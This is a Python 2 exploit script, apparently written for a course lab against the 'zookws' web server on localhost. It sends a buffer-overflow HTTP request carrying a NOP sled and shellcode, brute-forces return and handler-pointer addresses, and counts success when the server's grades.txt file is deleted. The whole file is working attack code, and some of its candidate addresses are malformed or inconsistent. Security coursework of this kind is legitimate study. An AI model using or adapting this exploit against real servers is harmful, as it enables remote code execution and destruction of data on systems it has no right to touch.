#!/usr/bin/python
import socket, struct, time, os, subprocess, urllib

shellcode = open("shellcode.bin").read()
sc = "\x90" * 32 + shellcode
RET_URI_OFF = 1024 - 15 + 16
UNLINK = 0x40a563b0

def attempt(addr, label):
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.3)
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"))
    time.sleep(1)
    pad = (RET_URI_OFF - 1) - len(sc)
    uri = "/" + urllib.quote(sc) + "A" * pad + struct.pack("<I", addr & 0xffffffff)
    req = "GET " + uri + " HTTP/1.0\r\n\r\n"
    s = socket.socket()
    s.connect(("localhost", 8080))
    s.send(req)
    s.close()
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    print(label, hex(addr), "PASS" if ok else "fail")
    return ok

addrs = [0xfffffc870, 0xfffffc880, 0xfffffc890, 0xfffffc8a0, 0xfffffc800,
         0xfffffc900, 0xfffffca00, 0xfffffcb00, 0xfffffcc0, 0xfffffcd0]
for a in addrs:
    if attempt(a, "sc"):
        break

# handler overwrite variant
HANDLER_OFF = 1024 - 15
for a in addrs:
    pad = (HANDLER_OFF - 1) - len(sc)
    os.system("killall -9 zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.3)
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"))
    time.sleep(1)
    uri = "/" + urllib.quote(sc) + "A" * pad + struct.pack("<I", a & 0xffffffff)
    req = "GET " + uri + " HTTP/1.0\r\n\r\n"
    s = socket.socket(); s.connect(("localhost", 8080)); s.send(req); s.close()
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    print("handler", hex(a), "PASS" if ok else "fail")
    if ok:
        break
